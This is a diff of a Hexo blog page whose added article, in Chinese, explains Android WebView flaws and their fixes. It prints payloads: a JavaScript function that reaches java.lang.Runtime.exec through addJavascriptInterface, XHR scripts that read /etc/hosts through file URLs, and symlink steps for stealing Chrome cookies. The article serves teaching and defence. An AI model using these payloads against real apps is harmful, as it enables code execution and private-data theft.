+<h3 id="WebViewJavascriptBridge"><a href="#WebViewJavascriptBridge" class="headerlink" title="WebViewJavascriptBridge"></a>WebViewJavascriptBridge</h3><p>WebViewJavascriptBridge是WebView和Js交互通信的桥梁，它是实现java和js的互相调用的桥梁。替代了WebView的自带的JavascriptInterface的接口，使得开发者更方便的让js和native灵活交互，使我们的开发更加灵活和安全.</p>
+<p>WebViewJavascriptBridge 在Android与IOS下均有对应的实现，一个demo见如下链接：<a href="https://www.jianshu.com/p/e37ccf32cb5b">https://www.jianshu.com/p/e37ccf32cb5b</a></p>
+<h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><h3 id="addJavascriptInterface-的安全隐患"><a href="#addJavascriptInterface-的安全隐患" class="headerlink" title="addJavascriptInterface()的安全隐患"></a>addJavascriptInterface()的安全隐患</h3><p>我们的js拿到了这个对象，就可以调用这个对象中的许多方法，包括系统类<code>java.lang.Runtime</code>类，从而进行任意代码执行。</p>
+<p>如以下的payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">cmdArgs</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"getClass"</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj]) &#123;  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);          </span><br><span class="line">            <span class="keyword">return</span>  <span class="built_in">window</span>[obj].getClass().forName(<span class="string">"java.lang.Runtime"</span>)  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ul>
+<li>Android4.2版本之后被调用的函数必须加入@JavascriptInterface，因此可以避免漏洞攻击；</li>
+<li>4.2版本以前可以通过拦截<code>prompt()</code>的方式进行修<ul>
+<li>继承WebView，重写<code>addJavascriptInterface</code>方法，维护一个对象映射关系的Map，将需要添加的JS街口放到这个Map中</li>
+<li>WebView加载页面前加载一段本地的JS代码，远离为：<ul>
+<li>JS调用一个Javascript方法，通过prompt把JS中的信息传递到Android端</li>
+<li>Android端的onJSPrompt方法中解析信息并且通过反射机制调用Java对象的方法，这样便可以自己设置黑名单或者白名单来实现安全限制，</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">javascript:(<span class="function"><span class="keyword">function</span> <span class="title">JsAddJavascriptInterface_</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="comment">// window.jsInterface 表示在window上声明了一个Js对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//   jsInterface = 注册的对象名</span></span><br><span class="line"><span class="comment">// 它注册了两个方法，onButtonClick(arg0)和onImageClick(arg0, arg1, arg2)</span></span><br><span class="line"><span class="comment">// 如果有返回值，就添加上return</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(<span class="built_in">window</span>.jsInterface)!=<span class="string">'undefined'</span>) &#123;      </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'window.jsInterface_js_interface_name is exist!!'</span>);&#125;   </span><br><span class="line">    <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">window</span>.jsInterface = &#123;     </span><br><span class="line"></span><br><span class="line">     <span class="comment">// 声明方法形式：方法名: function(参数)</span></span><br><span class="line">            onButtonClick:<span class="function"><span class="keyword">function</span>(<span class="params">arg0</span>) </span>&#123;   </span><br><span class="line"><span class="comment">// prompt（）返回约定的字符串</span></span><br><span class="line"><span class="comment">// 该字符串可自己定义</span></span><br><span class="line"><span class="comment">// 包含特定的标识符MyApp和 JSON 字符串（方法名，参数，对象名等）    </span></span><br><span class="line">                <span class="keyword">return</span> prompt(<span class="string">'MyApp:'</span>+<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">obj</span>:<span class="string">'jsInterface'</span>,<span class="attr">func</span>:<span class="string">'onButtonClick'</span>,<span class="attr">args</span>:[arg0]&#125;));  </span><br><span class="line">            &#125;,  </span><br><span class="line">              </span><br><span class="line"></span><br><span class="line">            onImageClick:<span class="function"><span class="keyword">function</span>(<span class="params">arg0,arg1,arg2</span>) </span>&#123;   </span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">prompt(<span class="string">'MyApp:'</span>+<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">obj</span>:<span class="string">'jsInterface'</span>,<span class="attr">func</span>:<span class="string">'onImageClick'</span>,<span class="attr">args</span>:[arg0,arg1,arg2]&#125;));  </span><br><span class="line">            &#125;,  </span><br><span class="line">        &#125;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当JS调用 onButtonClick（） 或 onImageClick（） 时，就会回调到Android中的 onJsPrompt （）</span></span><br><span class="line"><span class="comment">// 我们解析出方法名，参数，对象名</span></span><br><span class="line"><span class="comment">// 再通过反射机制调用Java对象的方法</span></span><br></pre></td></tr></table></figure>
+<h4 id="需要注意的细节问题"><a href="#需要注意的细节问题" class="headerlink" title="需要注意的细节问题"></a>需要注意的细节问题</h4><h5 id="加载代码的时机"><a href="#加载代码的时机" class="headerlink" title="加载代码的时机"></a>加载代码的时机</h5><ul>
+<li>由于当 WebView 跳转到下一个页面时，之前加载的 JS 可能已经失效</li>
+<li>所以，通常需要在以下方法中加载 JS：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onLoadResource（）；</span><br><span class="line">doUpdateVisitedHistory（）；</span><br><span class="line">onPageStarted（）；</span><br><span class="line">onPageFinished（）；</span><br><span class="line">onReceivedTitle（）；</span><br><span class="line">onProgressChanged（）；</span><br></pre></td></tr></table></figure>
+<h5 id="过滤掉Object类的方法"><a href="#过滤掉Object类的方法" class="headerlink" title="过滤掉Object类的方法"></a>过滤掉Object类的方法</h5><ul>
+<li>由于最终是通过反射得到Android指定对象的方法，所以同时也会得到基类的其他方法（最顶层的基类是 Object类）</li>
+<li>为了不把 getClass（）等方法注入到 JS 中，我们需要把 Object 的共有方法过滤掉，需要过滤的方法列表如下：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getClass()</span><br><span class="line">hashCode()</span><br><span class="line">notify()</span><br><span class="line">notifyAl()</span><br><span class="line">equals()</span><br><span class="line">toString()</span><br><span class="line">wait()</span><br></pre></td></tr></table></figure>
+<h3 id="密码明文存储漏洞"><a href="#密码明文存储漏洞" class="headerlink" title="密码明文存储漏洞"></a>密码明文存储漏洞</h3><p>WebView默认开启密码保存功能 ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(true)`</span><br></pre></td></tr></table></figure>
+<ul>
+<li>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</li>
+<li>如果选择”是”，密码会被明文保到 /data/data/com.package.name/databases/webview.db 中，这样就有被盗取密码的危险</li>
+</ul>
+<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>关闭密码保存提醒</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebSettings.setSavePassword(false)</span><br></pre></td></tr></table></figure>
+<h3 id="域控制不严格漏洞"><a href="#域控制不严格漏洞" class="headerlink" title="域控制不严格漏洞"></a>域控制不严格漏洞</h3><p>先看Android里的<code>WebViewActivity.java</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebViewActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> WebView webView;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_webview);</span><br><span class="line">        webView = (WebView) findViewById(R.id.webView);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//webView.getSettings().setAllowFileAccess(false);                    (1)</span></span><br><span class="line">        <span class="comment">//webView.getSettings().setAllowFileAccessFromFileURLs(true);         (2)</span></span><br><span class="line">        <span class="comment">//webView.getSettings().setAllowUniversalAccessFromFileURLs(true);    (3)</span></span><br><span class="line">        Intent i = getIntent();</span><br><span class="line">        String url = i.getData().toString(); <span class="comment">//url = file:///data/local/tmp/attack.html </span></span><br><span class="line">        webView.loadUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**Mainifest.xml**/</span></span><br><span class="line"><span class="comment">// 将该 WebViewActivity 在Mainifest.xml设置exported属性</span></span><br><span class="line"><span class="comment">// 表示：当前Activity是否可以被另一个Application的组件启动</span></span><br><span class="line">android:exported=<span class="string">"true"</span></span><br></pre></td></tr></table></figure>
+<p>即 A 应用可以通过 B 应用导出的 Activity 让 B 应用加载一个恶意的 file 协议的 url，从而可以获取 B 应用的内部私有文件，从而带来数据泄露威胁</p>
+<blockquote>
+<p>具体：当其他应用启动此 Activity 时， intent 中的 data 直接被当作 url 来加载（假定传进来的 url 为 file:///data/local/tmp/attack.html ），其他 APP 通过使用显式 ComponentName 或者其他类似方式就可以很轻松的启动该 WebViewActivity 并加载恶意url。</p>
+</blockquote>
+<p>下面我们着重分析WebView中getSettings类的方法对 WebView 安全性的影响：</p>
+<ul>
+<li>setAllowFileAccess（）</li>
+<li>setAllowFileAccessFromFileURLs（）</li>
+<li>setAllowUniversalAccessFromFileURLs（）</li>
+</ul>
+<h4 id="setAllowFileAccess"><a href="#setAllowFileAccess" class="headerlink" title="setAllowFileAccess()"></a>setAllowFileAccess()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="keyword">true</span>);     </span><br><span class="line"><span class="comment">// 默认设置为true，即允许在 File 域下执行任意 JavaScript 代码</span></span><br></pre></td></tr></table></figure>
+<p>使用 file 域加载的 js代码能够使用进行<strong>同源策略跨域访问</strong>，从而导致隐私信息泄露</p>
+<blockquote>
+<ol>
+<li>同源策略跨域访问：对私有目录文件进行访问</li>
+<li>针对 IM 类产品，泄露的是聊天信息、联系人等等</li>
+<li>针对浏览器类软件，泄露的是cookie 信息泄露。</li>
+</ol>
+</blockquote>
+<p>如果不允许使用 file 协议，则不会存在上述的威胁；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.getSettings().setAllowFileAccess(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+<p>但同时也限制了 WebView 的功能，使其不能加载本地的 html 文件</p>
+<p><strong>解决方案：</strong></p>
+<ul>
+<li>对于不需要使用 file 协议的应用，禁用 file 协议；</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setAllowFileAccess(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setAllowFileAccess(<span class="keyword">true</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止 file 协议加载 JavaScript</span></span><br><span class="line"><span class="keyword">if</span> (url.startsWith(<span class="string">"file://"</span>) &#123;</span><br><span class="line">    setJavaScriptEnabled(<span class="keyword">false</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="2-setAllowFileAccessFromFileURLs"><a href="#2-setAllowFileAccessFromFileURLs" class="headerlink" title="2. setAllowFileAccessFromFileURLs()"></a>2. setAllowFileAccessFromFileURLs()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置是否允许通过 file url 加载的 Js代码读取其他的本地文件</span></span><br><span class="line">webView.getSettings().setAllowFileAccessFromFileURLs(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 在Android 4.1前默认允许</span></span><br><span class="line"><span class="comment">// 在Android 4.1后默认禁止</span></span><br></pre></td></tr></table></figure>
+<p>当<code>AllowFileAccessFromFileURLs()</code>设置为 true 时，攻击者的JS代码为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function">function <span class="title">loadXMLDoc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">"file:///etc/hosts"</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert("status is"+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              console.log(xmlhttp.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,arm);</span><br><span class="line">    xmlhttp.send(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过该代码可成功读取 /etc/hosts 的内容数据</span></span><br></pre></td></tr></table></figure>
+<p><strong>解决方案：</strong>设置<code>setAllowFileAccessFromFileURLs(false);</code></p>
+<blockquote>
+<p>当设置成为 false 时，上述JS的攻击代码执行会导致错误，表示浏览器禁止从 file url 中的 javascript 读取其它本地文件。</p>
+</blockquote>
+<h2 id="3-setAllowUniversalAccessFromFileURLs"><a href="#3-setAllowUniversalAccessFromFileURLs" class="headerlink" title="3. setAllowUniversalAccessFromFileURLs()"></a>3. setAllowUniversalAccessFromFileURLs()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置是否允许通过 file url 加载的 Javascript 可以访问其他的源(包括http、https等源)</span></span><br><span class="line">webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在Android 4.1前默认允许（setAllowFileAccessFromFileURLs（）不起作用）</span></span><br><span class="line"><span class="comment">// 在Android 4.1后默认禁止</span></span><br></pre></td></tr></table></figure>
+<p>当<code>AllowFileAccessFromFileURLs()</code>被设置成true时，攻击者的JS代码是：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过该代码可成功读取 http://www.so.com 的内容</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function">function <span class="title">loadXMLDoc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">"http://www.so.com"</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert("status is"+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">             console.log(xmlhttp.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,arm);</span><br><span class="line">    xmlhttp.send(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>解决方案：</strong>设置<code>setAllowUniversalAccessFromFileURLs(false);</code></p>
+<h2 id="4-setJavaScriptEnabled"><a href="#4-setJavaScriptEnabled" class="headerlink" title="4. setJavaScriptEnabled()"></a>4. setJavaScriptEnabled()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置是否允许 WebView 使用 JavaScript（默认是不允许）</span></span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 但很多应用（包括移动浏览器）为了让 WebView 执行 http 协议中的 JavaScript，都会主动设置为true，不区别对待是非常危险的。</span></span><br></pre></td></tr></table></figure>
+<p>即使把<code>setAllowFileAccessFromFileURLs（）</code>和<code>setAllowUniversalAccessFromFileURLs（）</code>都设置为 false，通过 file URL 加载的 javascript 仍然有方法访问其他的本地文件：<strong>符号链接跨源攻击</strong></p>
+<blockquote>
+<p>前提是允许 file URL 执行 javascript，即<code>webView.getSettings().setJavaScriptEnabled(true);</code></p>
+</blockquote>
+<p>这一攻击能奏效的原因是：<strong>通过 javascript 的延时执行和将当前文件替换成指向其它文件的软链接就可以读取到被符号链接所指的文件</strong>。具体攻击步骤：</p>
+<ol>
+<li>把恶意的 js 代码输出到攻击应用的目录下，随机命名为 xx.html，修改该目录的权限；</li>
+<li>修改后休眠 1s，让文件操作完成；</li>
+<li>完成后通过系统的 Chrome 应用去打开该 xx.html 文件</li>
+<li>等待 4s 让 Chrome 加载完成该 html，最后将该 html 删除，并且使用 ln -s 命令为 Chrome 的 Cookie 文件创建软连接</li>
+</ol>
+<blockquote>
+<p>注：在该命令执行前 xx.html 是不存在的；执行完这条命令之后，就生成了这个文件，并且将 Cookie 文件链接到了 xx.html 上。</p>
+</blockquote>
+<p>于是就可通过链接来访问 Chrome 的 Cookie</p>
+<blockquote>
+<ol>
+<li>Google 没有进行修复，只是让Chrome 最新版本默认禁用 file 协议，所以这一漏洞在最新版的 Chrome 中并不存在</li>
+<li>但是，在日常大量使用 WebView 的App和浏览器，都有可能受到此漏洞的影响。通过利用此漏洞，容易出现数据泄露的危险</li>
+</ol>
+</blockquote>
+<p>如果是 file 协议，禁用 javascript 可以很大程度上减小跨源漏洞对 WebView 的威胁。</p>
+<blockquote>
+<ol>
+<li>但并不能完全杜绝跨源文件泄露。</li>
+<li>例：应用实现了下载功能，对于无法加载的页面，会自动下载到 sd 卡中；由于 sd 卡中的文件所有应用都可以访问，于是可以通过构造一个 file URL 指向被攻击应用的私有文件，然后用此 URL 启动被攻击应用的 WebActivity，这样由于该 WebActivity 无法加载该文件，就会将该文件下载到 sd 卡下面，然后就可以从 sd 卡上读取这个文件了</li>
+</ol>
+</blockquote>
+<h2 id="最终解决方案"><a href="#最终解决方案" class="headerlink" title="最终解决方案"></a>最终解决方案</h2><ul>
+<li>对于不需要使用 file 协议的应用，禁用 file 协议；</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 禁用 file 协议；</span></span><br><span class="line">setAllowFileAccess(<span class="keyword">false</span>); </span><br><span class="line">setAllowFileAccessFromFileURLs(<span class="keyword">false</span>);</span><br><span class="line">setAllowUniversalAccessFromFileURLs(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要使用 file 协议</span></span><br><span class="line">setAllowFileAccess(<span class="keyword">true</span>); </span><br><span class="line">setAllowFileAccessFromFileURLs(<span class="keyword">false</span>);</span><br><span class="line">setAllowUniversalAccessFromFileURLs(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止 file 协议加载 JavaScript</span></span><br><span class="line"><span class="keyword">if</span> (url.startsWith(<span class="string">"file://"</span>) &#123;</span><br><span class="line">    setJavaScriptEnabled(<span class="keyword">false</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的一些技巧可能随着安卓版本的更新迭代已经过时了，但是其中传递的一些思想方法在我们考虑做基于WebView的小程序时仍然有一定的借鉴意义，尤其是当我们的WebView的内容可以控制时，比如做内嵌浏览器或者小程序引擎等的情况，或者不可避免的页面跳转问题。</p>
+<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.jianshu.com/p/3a345d27cd42">https://www.jianshu.com/p/3a345d27cd42</a></p>
+<p><a href="https://blog.csdn.net/carson_ho/article/details/64904691">https://blog.csdn.net/carson_ho/article/details/64904691</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/threatIntelligence/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -363,12 +671,24 @@
                 
               
 
-              <time title="Created: 2019-04-25 00:25:55 / Modified: 00:29:12" itemprop="dateCreated datePublished" datetime="2019-04-25T00:25:55+08:00">2019-04-25</time>
+              <time title="Created: 2019-04-25 00:25:55" itemprop="dateCreated datePublished" datetime="2019-04-25T00:25:55+08:00">2019-04-25</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -611,12 +931,24 @@
                 
               
 
-              <time title="Created: 2019-04-05 18:28:26 / Modified: 18:32:14" itemprop="dateCreated datePublished" datetime="2019-04-05T18:28:26+08:00">2019-04-05</time>
+              <time title="Created: 2019-04-05 18:28:26" itemprop="dateCreated datePublished" datetime="2019-04-05T18:28:26+08:00">2019-04-05</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -806,7 +1138,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-05-14 19:00:48" itemprop="dateModified" datetime="2019-05-14T19:00:48+08:00">2019-05-14</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -953,12 +1285,24 @@
                 
               
 
-              <time title="Created: 2019-03-18 10:20:23 / Modified: 10:21:38" itemprop="dateCreated datePublished" datetime="2019-03-18T10:20:23+08:00">2019-03-18</time>
+              <time title="Created: 2019-03-18 10:20:23" itemprop="dateCreated datePublished" datetime="2019-03-18T10:20:23+08:00">2019-03-18</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
